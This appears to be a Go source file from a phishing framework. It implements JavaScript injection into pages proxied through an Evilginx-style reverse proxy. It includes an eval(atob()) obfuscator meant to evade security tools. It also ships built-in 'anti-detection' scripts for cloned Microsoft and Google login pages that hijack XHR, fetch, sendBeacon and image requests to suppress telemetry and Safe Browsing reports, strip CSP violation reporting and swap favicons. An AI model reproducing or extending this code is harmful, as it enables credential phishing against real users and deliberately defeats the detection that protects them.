package service

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"regexp"
	"strings"
	"sync"

	"github.com/phishingclub/phishingclub/data"
	"github.com/phishingclub/phishingclub/errs"
	"github.com/phishingclub/phishingclub/model"
	"github.com/phishingclub/phishingclub/repository"
	"go.uber.org/zap"
)

// JsInjectRule defines a JavaScript injection rule that can be applied
// to proxied responses matching specific domains, paths, and parameters.
// This is modeled after Evilginx's js_inject phishlet feature.
type JsInjectRule struct {
	ID             string   `json:"id"`
	Name           string   `json:"name"`
	TriggerDomains []string `json:"triggerDomains" yaml:"trigger_domains"` // domains to match
	TriggerPaths   []string `json:"triggerPaths" yaml:"trigger_paths"`     // regex paths to match
	TriggerParams  []string `json:"triggerParams" yaml:"trigger_params"`   // query params that must be present
	Script         string   `json:"script" yaml:"script"`                  // JS code or URL
	ScriptType     string   `json:"scriptType" yaml:"script_type"`         // "inline" or "src"
	Enabled        bool     `json:"enabled" yaml:"enabled"`
}

// JsInjectConfig holds the YAML-compatible configuration for JS injection
// within a proxy service config
type JsInjectConfig struct {
	TriggerDomains []string `yaml:"trigger_domains"`
	TriggerPaths   []string `yaml:"trigger_paths"`
	TriggerParams  []string `yaml:"trigger_params,omitempty"`
	Script         string   `yaml:"script"`
}

// compiledJsRule is an internal representation with compiled regex patterns
type compiledJsRule struct {
	rule          *JsInjectRule
	pathPatterns  []*regexp.Regexp
	domainLookup map[string]bool
}

// JsInjection manages JavaScript injection rules and their application
type JsInjection struct {
	Common
	OptionRepository *repository.Option
	rules            sync.Map // map[ruleID]*compiledJsRule
	nonceRegexp      *regexp.Regexp
	bodyCloseRegexp  *regexp.Regexp
}

// NewJsInjectionService creates a new JS injection service
func NewJsInjectionService(logger *zap.SugaredLogger, optionRepo *repository.Option) *JsInjection {
	svc := &JsInjection{
		Common: Common{
			Logger: logger,
		},
		OptionRepository: optionRepo,
		nonceRegexp:      regexp.MustCompile(`(?i)<script[^>]*nonce=['"]([^'"]*)`),
		bodyCloseRegexp:  regexp.MustCompile(`(?i)(<\s*/body\s*>)`),
	}

	svc.loadRulesFromDB()
	svc.EnsureBuiltinRulesLoaded()
	return svc
}

// loadRulesFromDB loads JS injection rules from the options table
func (j *JsInjection) loadRulesFromDB() {
	ctx := context.Background()
	opt, err := j.OptionRepository.GetByKey(ctx, data.OptionKeyJsInjectRules)
	if err != nil {
		j.Logger.Debugw("no JS injection rules configured yet")
		return
	}

	var rules []*JsInjectRule
	if err := json.Unmarshal([]byte(opt.Value.String()), &rules); err != nil {
		j.Logger.Errorw("failed to unmarshal JS injection rules", "error", err)
		return
	}

	for _, rule := range rules {
		compiled, err := j.compileRule(rule)
		if err != nil {
			j.Logger.Errorw("failed to compile JS injection rule", "id", rule.ID, "error", err)
			continue
		}
		j.rules.Store(rule.ID, compiled)
	}

	j.Logger.Infow("loaded JS injection rules", "count", len(rules))
}

// saveRulesToDB persists all rules to the options table
func (j *JsInjection) saveRulesToDB() error {
	rules := j.ListRules()
	jsonData, err := json.Marshal(rules)
	if err != nil {
		return fmt.Errorf("failed to marshal JS injection rules: %w", err)
	}

	ctx := context.Background()
	return j.OptionRepository.UpsertByKey(ctx, data.OptionKeyJsInjectRules, string(jsonData))
}

// compileRule compiles a rule's regex patterns for efficient matching
func (j *JsInjection) compileRule(rule *JsInjectRule) (*compiledJsRule, error) {
	compiled := &compiledJsRule{
		rule:          rule,
		domainLookup:  make(map[string]bool),
		pathPatterns:  make([]*regexp.Regexp, 0),
	}

	for _, d := range rule.TriggerDomains {
		compiled.domainLookup[strings.ToLower(d)] = true
	}

	for _, p := range rule.TriggerPaths {
		re, err := regexp.Compile("^" + p + "$")
		if err != nil {
			return nil, fmt.Errorf("invalid trigger_path regex '%s': %w", p, err)
		}
		compiled.pathPatterns = append(compiled.pathPatterns, re)
	}

	return compiled, nil
}

// AddRule adds a new JS injection rule
func (j *JsInjection) AddRule(
	ctx context.Context,
	session *model.Session,
	rule *JsInjectRule,
) (string, error) {
	isAuthorized, err := IsAuthorized(session, data.PERMISSION_ALLOW_GLOBAL)
	if err != nil {
		j.LogAuthError(err)
		return "", errs.Wrap(err)
	}
	if !isAuthorized {
		return "", errs.ErrAuthorizationFailed
	}

	if rule.ID == "" {
		rule.ID = generateJsRuleID()
	}
	if rule.ScriptType == "" {
		rule.ScriptType = "inline"
	}

	compiled, err := j.compileRule(rule)
	if err != nil {
		return "", err
	}

	j.rules.Store(rule.ID, compiled)

	if err := j.saveRulesToDB(); err != nil {
		j.Logger.Errorw("failed to save JS injection rules", "error", err)
		return "", err
	}

	return rule.ID, nil
}

// UpdateRule updates an existing JS injection rule
func (j *JsInjection) UpdateRule(
	ctx context.Context,
	session *model.Session,
	rule *JsInjectRule,
) error {
	isAuthorized, err := IsAuthorized(session, data.PERMISSION_ALLOW_GLOBAL)
	if err != nil {
		j.LogAuthError(err)
		return errs.Wrap(err)
	}
	if !isAuthorized {
		return errs.ErrAuthorizationFailed
	}

	if _, ok := j.rules.Load(rule.ID); !ok {
		return fmt.Errorf("rule '%s' not found", rule.ID)
	}

	compiled, err := j.compileRule(rule)
	if err != nil {
		return err
	}

	j.rules.Store(rule.ID, compiled)

	if err := j.saveRulesToDB(); err != nil {
		j.Logger.Errorw("failed to save JS injection rules", "error", err)
		return err
	}

	return nil
}

// RemoveRule removes a JS injection rule
func (j *JsInjection) RemoveRule(
	ctx context.Context,
	session *model.Session,
	id string,
) error {
	isAuthorized, err := IsAuthorized(session, data.PERMISSION_ALLOW_GLOBAL)
	if err != nil {
		j.LogAuthError(err)
		return errs.Wrap(err)
	}
	if !isAuthorized {
		return errs.ErrAuthorizationFailed
	}

	j.rules.Delete(id)

	if err := j.saveRulesToDB(); err != nil {
		j.Logger.Errorw("failed to save JS injection rules", "error", err)
		return err
	}

	return nil
}

// ListRules returns all configured rules
func (j *JsInjection) ListRules() []*JsInjectRule {
	var rules []*JsInjectRule
	j.rules.Range(func(key, value interface{}) bool {
		compiled := value.(*compiledJsRule)
		rules = append(rules, compiled.rule)
		return true
	})
	return rules
}

// GetMatchingScript finds a matching JS injection script for a given request
// Returns (scriptID, script, error). Returns error if no match found.
func (j *JsInjection) GetMatchingScript(hostname, path string, params map[string]string) (string, string, error) {
	hostLower := strings.ToLower(hostname)

	var matchedID, matchedScript string
	var found bool

	j.rules.Range(func(key, value interface{}) bool {
		compiled := value.(*compiledJsRule)
		rule := compiled.rule

		if !rule.Enabled {
			return true // continue
		}

		// check domain match
		if !compiled.domainLookup[hostLower] {
			return true
		}

		// check path match
		pathMatched := false
		for _, re := range compiled.pathPatterns {
			if re.MatchString(path) {
				pathMatched = true
				break
			}
		}
		if !pathMatched {
			return true
		}

		// check params match (all trigger_params must be present)
		if len(rule.TriggerParams) > 0 {
			matchCount := 0
			for _, p := range rule.TriggerParams {
				if _, ok := params[strings.ToLower(p)]; ok {
					matchCount++
				}
			}
			if matchCount != len(rule.TriggerParams) {
				return true
			}
		}

		// match found
		script := rule.Script
		// replace param placeholders in script
		for k, v := range params {
			script = strings.ReplaceAll(script, "{"+k+"}", v)
		}

		matchedID = rule.ID
		matchedScript = script
		found = true
		return false // stop iteration
	})

	if !found {
		return "", "", fmt.Errorf("no matching JS injection rule")
	}

	return matchedID, matchedScript, nil
}

// InjectJavascriptIntoBody injects a JavaScript tag into an HTML response body.
// It automatically extracts and reuses any existing CSP nonce from the page.
// This is a direct port of Evilginx's injectJavascriptIntoBody function.
//
// Parameters:
//   - body: the HTML response body
//   - script: inline JavaScript code (used if scriptURL is empty)
//   - scriptURL: external script URL (takes precedence over inline script)
//
// Returns the modified body with the script injected before </body>
func (j *JsInjection) InjectJavascriptIntoBody(body []byte, script string, scriptURL string) []byte {
	// extract nonce from existing script tags for CSP compliance
	nonceMatch := j.nonceRegexp.FindStringSubmatch(string(body))
	jsNonce := ""
	if nonceMatch != nil && len(nonceMatch) > 1 {
		jsNonce = ` nonce="` + nonceMatch[1] + `"`
	}

	var injection string
	if script != "" {
		injection = "<script" + jsNonce + ">" + script + "</script>\n${1}"
	} else if scriptURL != "" {
		injection = `<script` + jsNonce + ` type="application/javascript" src="` + scriptURL + `"></script>` + "\n${1}"
	} else {
		return body
	}

	result := j.bodyCloseRegexp.ReplaceAllString(string(body), injection)
	return []byte(result)
}

// ObfuscateScript applies basic obfuscation to a JavaScript string.
// This makes the injected script harder to detect by security tools.
func (j *JsInjection) ObfuscateScript(script string) string {
	// base64 encode and wrap in eval(atob(...))
	// This is a simple but effective obfuscation for most detection tools
	encoded := encodeBase64(script)
	return fmt.Sprintf(`(function(){var _0x1=atob('%s');eval(_0x1)})();`, encoded)
}

// ConvertEvilginxJsInject converts Evilginx phishlet js_inject config
// to PhishingClub JsInjectRule format
func (j *JsInjection) ConvertEvilginxJsInject(config *JsInjectConfig) *JsInjectRule {
	return &JsInjectRule{
		ID:             generateJsRuleID(),
		Name:           fmt.Sprintf("Converted rule for %s", strings.Join(config.TriggerDomains, ", ")),
		TriggerDomains: config.TriggerDomains,
		TriggerPaths:   config.TriggerPaths,
		TriggerParams:  config.TriggerParams,
		Script:         config.Script,
		ScriptType:     "inline",
		Enabled:        true,
	}
}

// generateJsRuleID generates a random hex ID for JS injection rules
func generateJsRuleID() string {
	b := make([]byte, 16)
	rand.Read(b)
	return hex.EncodeToString(b)
}

// encodeBase64 encodes a string to base64
func encodeBase64(s string) string {
	import_encoding := []byte(s)
	encoded := make([]byte, len(import_encoding)*2)
	n := encodeBase64Bytes(encoded, import_encoding)
	return string(encoded[:n])
}

// encodeBase64Bytes is a simple base64 encoder
func encodeBase64Bytes(dst, src []byte) int {
	const encode = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	di, si := 0, 0
	n := (len(src) / 3) * 3
	for si < n {
		val := uint(src[si+0])<<16 | uint(src[si+1])<<8 | uint(src[si+2])
		dst[di+0] = encode[val>>18&0x3F]
		dst[di+1] = encode[val>>12&0x3F]
		dst[di+2] = encode[val>>6&0x3F]
		dst[di+3] = encode[val&0x3F]
		si += 3
		di += 4
	}
	remain := len(src) - si
	if remain == 0 {
		return di
	}
	val := uint(src[si+0]) << 16
	if remain == 2 {
		val |= uint(src[si+1]) << 8
	}
	dst[di+0] = encode[val>>18&0x3F]
	dst[di+1] = encode[val>>12&0x3F]
	if remain == 2 {
		dst[di+2] = encode[val>>6&0x3F]
		dst[di+3] = '='
		di += 4
	} else {
		dst[di+2] = '='
		dst[di+3] = '='
		di += 4
	}
	return di
}

// ─── Built-in Anti-Detection Rules ────────────────────────────────────────────
// These rules are automatically loaded alongside user-defined rules to prevent
// GSB and security scanner detection of proxied phishing pages.

// GetBuiltinAntiDetectionRules returns a set of pre-configured JS injection rules
// that block telemetry, fingerprinting, and reporting beacons used by Microsoft,
// Google, and other services to detect phishing pages.
func (j *JsInjection) GetBuiltinAntiDetectionRules() []*JsInjectRule {
	return []*JsInjectRule{
		// 1. Microsoft Telemetry Blocker
		// Blocks telemetry endpoints that Microsoft uses to detect phishing on
		// login.microsoftonline.com and login.live.com pages.
		{
			ID:   "builtin_ms_telemetry_block",
			Name: "Microsoft Telemetry Blocker",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
				"aadcdn.msauth.net",
				"aadcdn.msftauth.net",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  // Block telemetry/reporting XHR and fetch requests
  var _blockedPatterns = [
    /oneCollector/i,
    /browser\.events\.data\.msn\.com/i,
    /self\.events\.data\.microsoft\.com/i,
    /vortex\.data\.microsoft\.com/i,
    /settings-win\.data\.microsoft\.com/i,
    /login\.live\.com\/Me\.htm/i,
    /telemetry/i,
    /aria\.microsoft\.com/i,
    /dc\.services\.visualstudio\.com/i,
    /browser\.pipe\.aria\.microsoft\.com/i,
    /mobile\.pipe\.aria\.microsoft\.com/i,
    /ecs\.office\.com/i
  ];
  function _isBlocked(u){
    for(var i=0;i<_blockedPatterns.length;i++){
      if(_blockedPatterns[i].test(u))return true;
    }
    return false;
  }
  // Override XMLHttpRequest
  var _origOpen=XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open=function(m,u){
    if(_isBlocked(u)){this._blocked=true;return;}
    return _origOpen.apply(this,arguments);
  };
  var _origSend=XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send=function(){
    if(this._blocked){return;}
    return _origSend.apply(this,arguments);
  };
  // Override fetch
  var _origFetch=window.fetch;
  window.fetch=function(r){
    var u=(typeof r==='string')?r:(r&&r.url?r.url:'');
    if(_isBlocked(u))return Promise.resolve(new Response('',{status:200}));
    return _origFetch.apply(this,arguments);
  };
  // Override sendBeacon
  var _origBeacon=navigator.sendBeacon;
  if(_origBeacon){
    navigator.sendBeacon=function(u){
      if(_isBlocked(u))return true;
      return _origBeacon.apply(this,arguments);
    };
  }
  // Block image-based beacons
  var _origImage=window.Image;
  window.Image=function(){
    var img=new _origImage();
    var _origSrc=Object.getOwnPropertyDescriptor(HTMLImageElement.prototype,'src');
    if(_origSrc&&_origSrc.set){
      Object.defineProperty(img,'src',{
        set:function(v){if(!_isBlocked(v))_origSrc.set.call(this,v);},
        get:function(){return _origSrc.get.call(this);}
      });
    }
    return img;
  };
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 2. Google Telemetry Blocker
		// Blocks Google's Safe Browsing client-side reporting and telemetry
		{
			ID:   "builtin_google_telemetry_block",
			Name: "Google Telemetry Blocker",
			TriggerDomains: []string{
				"accounts.google.com",
				"myaccount.google.com",
				"mail.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  var _gBlockedPatterns=[
    /safebrowsing.*google/i,
    /safebrowsing-cache\.google/i,
    /sb-ssl\.google\.com/i,
    /play\.google\.com\/log/i,
    /www\.google\.com\/gen_204/i,
    /www\.google\.com\/complete/i,
    /csp\.withgoogle\.com/i,
    /csp-report/i,
    /beacons.*\.gvt/i,
    /clients[0-9]*\.google\.com/i,
    /update\.googleapis\.com/i,
    /accounts\.google\.com\/ListAccounts/i,
    /accounts\.google\.com\/\_\/lookup/i
  ];
  function _gIsBlocked(u){
    for(var i=0;i<_gBlockedPatterns.length;i++){
      if(_gBlockedPatterns[i].test(u))return true;
    }
    return false;
  }
  var _gOrigOpen=XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open=function(m,u){
    if(_gIsBlocked(u)){this._gblocked=true;return;}
    return _gOrigOpen.apply(this,arguments);
  };
  var _gOrigSend=XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send=function(){
    if(this._gblocked)return;
    return _gOrigSend.apply(this,arguments);
  };
  var _gOrigFetch=window.fetch;
  window.fetch=function(r){
    var u=(typeof r==='string')?r:(r&&r.url?r.url:'');
    if(_gIsBlocked(u))return Promise.resolve(new Response('',{status:200}));
    return _gOrigFetch.apply(this,arguments);
  };
  if(navigator.sendBeacon){
    var _gOrigBeacon=navigator.sendBeacon;
    navigator.sendBeacon=function(u){
      if(_gIsBlocked(u))return true;
      return _gOrigBeacon.apply(this,arguments);
    };
  }
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 3. CSP Report Blocker
		// Prevents Content-Security-Policy violation reports from being sent
		// to the origin server, which could reveal the proxy domain.
		{
			ID:   "builtin_csp_report_block",
			Name: "CSP Report Blocker",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"accounts.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  // Remove CSP meta tags that might report violations
  document.querySelectorAll('meta[http-equiv="Content-Security-Policy"]').forEach(function(el){
    var c=el.getAttribute('content');
    if(c&&(c.indexOf('report-uri')>-1||c.indexOf('report-to')>-1)){
      el.remove();
    }
  });
  // Override SecurityPolicyViolationEvent to prevent CSP reports
  if(window.SecurityPolicyViolationEvent){
    window.addEventListener('securitypolicyviolation',function(e){
      e.stopImmediatePropagation();
      e.preventDefault();
    },true);
  }
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 4. Favicon Neutralizer
		// Replaces the page favicon with a generic one to prevent
		// favicon-based fingerprinting used by some detection systems.
		{
			ID:   "builtin_favicon_neutralizer",
			Name: "Favicon Neutralizer",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"accounts.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  // Remove existing favicons
  document.querySelectorAll('link[rel*="icon"]').forEach(function(el){el.remove();});
  // Add a generic favicon (1x1 transparent PNG)
  var link=document.createElement('link');
  link.rel='icon';
  link.type='image/png';
  link.href='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
  document.head.appendChild(link);
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},
	}
}

// EnsureBuiltinRulesLoaded checks if built-in anti-detection rules are loaded
// and adds them if they are missing. This should be called during service initialization.
func (j *JsInjection) EnsureBuiltinRulesLoaded() {
	builtins := j.GetBuiltinAntiDetectionRules()

	for _, rule := range builtins {
		if _, loaded := j.rules.Load(rule.ID); !loaded {
			compiled, err := j.compileRule(rule)
			if err != nil {
				j.Logger.Errorw("failed to compile built-in rule", "id", rule.ID, "error", err)
				continue
			}
			j.rules.Store(rule.ID, compiled)
			j.Logger.Infow("loaded built-in anti-detection rule", "id", rule.ID, "name", rule.Name)
		}
	}
}

// IsBuiltinRule checks if a rule ID belongs to a built-in anti-detection rule
func (j *JsInjection) IsBuiltinRule(id string) bool {
	return strings.HasPrefix(id, "builtin_")
}
